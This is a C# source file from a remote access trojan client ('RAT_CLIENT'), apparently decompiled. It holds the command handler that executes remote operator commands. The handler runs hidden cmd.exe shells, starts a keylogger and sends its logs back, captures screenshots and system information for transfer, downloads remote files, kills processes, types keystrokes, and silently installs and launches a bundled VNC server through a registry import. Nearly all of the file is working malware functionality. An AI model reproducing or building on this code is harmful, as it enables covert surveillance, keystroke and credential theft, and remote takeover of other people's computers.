using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using RAT_CLIENT.Properties;

namespace RAT_CLIENT
{
	internal class Commands
	{
		private string Delimeter;

		private string Command;

		private string Result;

		private static Thread KeyscanThread;

		[DllImport("winmm.dll")]
		private static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

		public Commands(string text)
		{
			int num = text.IndexOf(' ');
			if (num == -1)
			{
				Delimeter = text;
				Command = "";
			}
			else
			{
				Delimeter = text.Substring(0, num);
				Command = text.Substring(num + 1);
			}
		}

		public string Process()
		{
			switch (Delimeter)
			{
			case "/cdtray":
				if (Command == "open")
				{
					mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
					Result = "CD Tray Opened!";
				}
				else if (Command == "close")
				{
					mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
					Result = "CD Tray Closed!";
				}
				return Result;
			case "/diskimage":
				DiskImager.GetImage(int.Parse(Command));
				return Result = "Successfully retrieved disk image!";
			case "/download":
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile(Command, Path.GetFileName(Command));
				return Result = "Downloaded " + Path.GetFileName(Command) + " Successfully!";
			}
			case "/getprocesses":
			{
				Result = "";
				Process[] processes2 = System.Diagnostics.Process.GetProcesses();
				Process[] array = processes2;
				foreach (Process process2 in array)
				{
					string text = string.Format("{0,-25}  {1,-2}", process2.ProcessName, process2.Id.ToString());
					Result = Result + text + Environment.NewLine;
				}
				return Result;
			}
			case "/keyscan_start":
				KeyscanThread = new Thread(Keyscan.Start);
				KeyscanThread.Start();
				return string.Empty;
			case "/keyscan_stop":
				KeyscanThread.Abort();
				if (File.Exists("logs.txt"))
				{
					Result = "@File Transfer@";
					Result += "logs.txt";
					return Result;
				}
				return string.Empty;
			case "/kill":
			{
				Process[] processes = System.Diagnostics.Process.GetProcesses();
				Process[] array = processes;
				foreach (Process process2 in array)
				{
					if (Command == process2.Id.ToString() || Command == process2.ProcessName)
					{
						process2.Kill();
						return Result = "Process(" + process2.ProcessName + ") Terminated Successfully!";
					}
				}
				return Result = "Process not found!";
			}
			case "/msgbox":
				ThreadPool.QueueUserWorkItem(MBox, Command);
				return Result = "MsgBox(" + Command + ") executed!";
			case "/querydisks":
			{
				string[] array2 = DiskImager.QueryLogicalDisks();
				foreach (string text2 in array2)
				{
					Result += text2;
				}
				return Result;
			}
			case "/screenshot":
			{
				Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				Image image = Image.FromHbitmap(bitmap.GetHbitmap());
				Graphics graphics = Graphics.FromImage(image);
				graphics.CopyFromScreen(Point.Empty, Point.Empty, image.Size);
				image.Save("screenshot.png", ImageFormat.Png);
				if (File.Exists("screenshot.png"))
				{
					Result = "@File Transfer@";
					Result += "screenshot.png";
					return Result;
				}
				return string.Empty;
			}
			case "/shell":
			{
				Process process3 = new Process();
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c " + Command);
				processStartInfo2.CreateNoWindow = true;
				processStartInfo2.RedirectStandardOutput = true;
				processStartInfo2.RedirectStandardInput = true;
				processStartInfo2.UseShellExecute = false;
				process3.StartInfo = processStartInfo2;
				process3.Start();
				Result = process3.StandardOutput.ReadToEnd();
				process3.WaitForExit();
				process3.Close();
				return Result;
			}
			case "/speak":
				ThreadPool.QueueUserWorkItem(Speak, Command);
				return string.Empty;
			case "/sysinfo":
			{
				if (File.Exists("sysinfo.txt"))
				{
					File.Delete("sysinfo.txt");
				}
				Process process = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c dxdiag /whql:off /t sysinfo.txt");
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardInput = true;
				processStartInfo.UseShellExecute = false;
				process.StartInfo = processStartInfo;
				process.Start();
				process.WaitForExit();
				if (File.Exists("sysinfo.txt"))
				{
					Result = "@File Transfer@";
					Result += "sysinfo.txt";
					return Result;
				}
				return string.Empty;
			}
			case "/type":
				ThreadPool.QueueUserWorkItem(Type, Command);
				return string.Empty;
			case "/vnc":
				ThreadPool.QueueUserWorkItem(VNC, Command);
				return string.Empty;
			default:
				return Result = "Unrecognized Command!";
			}
		}

		private void Type(object o)
		{
			string keys = (string)o;
			SendKeys.SendWait(keys);
		}

		private void Speak(object o)
		{
			string textToSpeak = (string)o;
			SpeechSynthesizer speechSynthesizer = new SpeechSynthesizer();
			speechSynthesizer.Speak(textToSpeak);
		}

		private void MBox(object o)
		{
			string text = (string)o;
			MessageBox.Show(text);
		}

		private void VNC(object o)
		{
			Process[] processes = System.Diagnostics.Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.Contains("VNC"))
				{
					process.Kill();
				}
			}
			if (((string)o).Contains("start"))
			{
				try
				{
					Thread.Sleep(2000);
					File.WriteAllBytes("binded.exe", Resources.binded);
					Process process2 = System.Diagnostics.Process.Start("binded.exe");
					process2.WaitForExit();
					process2.Close();
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.CreateNoWindow = true;
					processStartInfo.FileName = "regedit.exe";
					processStartInfo.Arguments = "/s vnc.reg";
					process2 = new Process();
					process2.StartInfo = processStartInfo;
					process2.Start();
					process2.WaitForExit();
					process2.Close();
					process2 = new Process();
					processStartInfo.FileName = "WinVNC.exe";
					processStartInfo.Arguments = "-run";
					process2.StartInfo = processStartInfo;
					Thread.Sleep(2000);
					process2.Start();
					Thread.Sleep(5000);
					Process process3 = new Process();
					processStartInfo.Arguments = "-connect 127.0.0.1";
					process3.StartInfo = processStartInfo;
					process2.Start();
				}
				catch
				{
				}
			}
			if (((string)o).Contains("stop"))
			{
				Process process2 = System.Diagnostics.Process.Start("WinVNC.exe", "-kill");
				Thread.Sleep(2000);
				File.Delete("binded.exe");
				File.Delete("vnc.reg");
				File.Delete("VNCHooks.dll");
				File.Delete("WinVNC.exe");
			}
		}
	}
}
